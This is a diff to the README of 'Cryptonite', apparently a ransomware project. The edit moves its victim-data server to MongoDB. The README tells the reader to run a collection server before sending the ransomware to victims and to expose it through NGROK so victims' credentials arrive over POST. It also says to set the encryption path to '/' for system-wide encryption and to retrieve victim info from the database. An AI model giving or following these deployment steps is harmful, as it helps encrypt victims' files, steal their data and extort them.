@@ -61,7 +61,11 @@ The following setups need to be done if you are using **Cryptonite** for the fir
     pip install -r "requirements.txt"  
 
 ## 2. FIRING UP THE SERVER!
-Run the **Server.py** file before you send the ransomware to victims. Make sure that **Server.py** runs all the time. Running the server also creates a **DB file** to store the victims' info.   
+Since you decided to opt for **MONGO DB** as the database of your choice, I assume you know how to setup a Mongo DB server or Mongo DB Atlas to push the data into the database. In case you forgot, don't worry. Here is a brief way to achieve the same:-
+ - In case you are opting for mongodb atlas, then create an account for it, and pass the URL of your mongo cluster in connection_string variable ![here](https://github.com/CYBERDEVILZ/Cryptonite/blob/6cf53ae014211dfad83537d46538e1fc9be9845d/Server-mongo.py#L18)
+ - In case you are opting for local storage, then download mongo server on your local system, start Mongo DB server on your computer and pass the URL in connection_string variable ![here](https://github.com/CYBERDEVILZ/Cryptonite/blob/6cf53ae014211dfad83537d46538e1fc9be9845d/Server-mongo.py#L18) (default mongo server is at https://localhost:27017 )   
+   
+Run the **Server-mongo.py** file before you send the ransomware to victims. Make sure that **Server-mongo.py** runs all the time.
 
 We will be running the Server on port 8000 of our localhost. Hence we need to perform port forwarding using **NGROK** to receive the credentials of our victims sent by our Ransomware. That will be our next step.
 
@@ -96,7 +100,7 @@ Believe me when I say this... You can **safely test** this Ransomware on your de
 
 ## Points to note...
 
-* When you execute **Cryptonite.py**, go to the **Server.py** terminal and lookout whether you received **POST** request. If yes then the **NGROK** configuration was successful.   
+* When you execute **Cryptonite.py**, go to the **Server-mongo.py** terminal and lookout whether you received **POST** request. If yes then the **NGROK** configuration was successful.   
 * You can retrieve the information about the victims via executing the **retrieveinfo.py** file. Just type ```python retrieveinfo.py``` inside a new terminal in the current directory.
 
 ## 6. SEND IT TO YOUR VICTIMS
@@ -109,11 +113,11 @@ After we have tested our Ransomware, we intend to send it to the victims in the 
 ### Things to consider before sending the exe file
 * Make sure that the [Encryption Folder Path](https://github.com/CYBERDEVILZ/Cryptonite/blob/0e835b6875c1a1f53c724f941c63564a2d93d6cd/Cryptonite.py#L94) is changed from **./testfolder** to **/** (if you are going for system wide encryption) or any folder path of your choice.
 * All the Details should be correctly filled.
-* **NGROK** and the **Server.py** must run all the time. Failure of which can result in Ransomware not being able to encrypt files (a popup of network error will be shown on the victim's screen and the Ransomware terminates).   
+* **NGROK** and the **Server-mongo.py** must run all the time. Failure of which can result in Ransomware not being able to encrypt files (a popup of network error will be shown on the victim's screen and the Ransomware terminates).   
    
 ## 6. RETRIEVE INFO FROM THE DATABASE
 
-If a victim falls prey to **Cryptonite**, a **POST request** carrying his info will be sent from his device to our local server (**Server.py**). Check the terminal of **Server.py** to see if any victim has sent his information to us. When **Cryptonite** sends the info to our server, the terminal of **Server.py** looks like this:- 
+If a victim falls prey to **Cryptonite**, a **POST request** carrying his info will be sent from his device to our database server (**Server-mongo.py**). Check the terminal of **Server-mongo.py** to see if any victim has sent his information to us. When **Cryptonite** sends the info to our database server, the terminal of **Server-mongo.py** looks like this:- 
 
 ![server-post](https://user-images.githubusercontent.com/55954313/128585714-b6779259-78ed-4b36-b149-50aa7d89c5fe.png)   
    
